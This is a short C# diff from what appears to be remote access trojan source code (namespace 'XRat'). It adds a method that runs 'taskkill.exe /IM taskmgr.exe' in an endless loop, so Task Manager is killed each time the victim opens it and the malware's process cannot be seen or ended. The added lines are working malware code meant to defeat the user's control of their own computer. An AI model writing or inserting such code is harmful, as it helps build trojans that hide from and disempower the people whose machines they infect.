@@ -208,6 +208,13 @@ namespace XRat
                 return $"Произошла ошибка: {ex.Message}";
             }
         }
-    }
 
+        public static Task Taskmgr()
+        {
+            while (true)
+            {
+                CMD(@"taskkill.exe /IM taskmgr.exe");
+            }
+        }
+    }
 }
